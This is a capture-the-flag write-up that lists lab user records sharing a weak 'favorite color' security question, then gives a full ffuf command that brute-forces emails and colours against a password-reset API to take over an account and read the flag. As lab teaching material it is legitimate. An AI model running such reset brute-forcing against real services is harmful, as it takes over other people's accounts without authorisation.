### Submit the contents of the flag at '/flag.txt'.

This is our user roles

![](Screenshot%202026-09-16%20at%2008.27.21.png)

The security question might be useful for us to reset user password with question-answer

![](Screenshot%202026-09-16%20at%2008.34.18.png)

Let's set new user's password, but first we need to sort users that have the simple security question

```http
{
      "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Patrick Howard",
      "email": "P.Howard1536@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Luca Walker",
      "email": "L.Walker1872@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "fafebea0-8894-4744-b7de-6c66d5749740",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Tucker Harris",
      "email": "T.Harris1814@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "36f17195-395f-443e-93a4-8ceee81c6106",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Brandon Rogers",
      "email": "B.Rogers1535@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
    {
      "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
      "name": "Mason Alexander",
      "email": "M.Alexander1650@globalsolutions.com",
      "securityQuestion": "What is your favorite color?",
      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
    },
}
```

Now, we gonna create emails.txt & colors.txt to fuzzing
![](Screenshot%202026-09-16%20at%2008.44.45.png)

```sh
ffuf -w emails.txt:EMAIL -w colors.txt:COLOR -X 'POST' -u  'http://154.57.164.67:30748/api/v2/authentication/suppliers/passwords/resets/security-question-answers'   -H 'accept: application/json'   -H 'Content-Type: application/json'   -d '{
  "SupplierEmail": "EMAIL",
  "SecurityQuestionAnswer": "COLOR",
  "NewPassword": "67TEST"
}' -fs 23
```
![](Screenshot%202026-09-16%20at%2008.52.05.png)

Login B.Rogers1535 as a supplier

![](Screenshot%202026-09-16%20at%2008.54.14.png)

![](Screenshot%202026-09-16%20at%2008.56.37.png)

![](Screenshot%202026-09-16%20at%2008.58.59.png)

![](Screenshot%202026-09-16%20at%2008.59.21.png)

Now we have the flag but in base64 form

![](Screenshot%202026-09-16%20at%2008.59.48.png)

Using Cyberchef or shell to decode it

![](Screenshot%202026-09-16%20at%2009.00.44.png)